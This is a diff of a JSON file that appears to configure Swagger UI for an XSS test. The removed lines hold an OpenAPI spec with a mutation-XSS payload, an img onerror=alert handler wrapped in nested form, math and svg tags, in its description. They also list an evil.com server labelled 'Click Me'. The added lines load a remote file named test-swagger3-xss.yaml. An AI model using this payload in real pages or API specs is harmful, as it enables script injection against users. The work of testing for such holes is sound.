@@ -1,43 +1,12 @@
 {
     "openapi": "3.0.0",
-    "info": {
-        "title": "OpenAPI Bug Test",
-        "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert('textarea') src=1>\"></form>",
-        "contact": {
-            "name": "Test",
-            "url": "http://www.test.com/",
-            "email": "test@domain.tld"
-        },
-        "license": {
-            "name": "proprietary"
-        },
-        "version": "1.0"
-    },
-    "servers": [
+    {
+    "url": "https://raw.githubusercontent.com/kluo84/Misc_stuff/master/test-swagger3-xss.yaml",
+    "urls": [
         {
-        "url": "https://evil.com",
-        "description": "Click Me"
+            "url": "https://raw.githubusercontent.com/kluo84/Misc_stuff/master/test-swagger3-xss.yaml",
+            "name": "Halloween"
         }
-    ],
-    "paths": {
-        "/v1/my-operation": {
-            "get": {
-                "summary": "Some operation.",
-                "description": "Some REST operation.",
-                "security": [],
-                "tags": [
-                    "Test"
-                ],
-                "operationId": "getSomething",
-                "responses": {
-                    "204": {
-                        "description": "Indicates, the request was successful."
-                    },
-                    "500": {
-                        "description": "Indicates, the request failed."
-                    }
-                }
-            }
-        }
+    ]
     }
 }
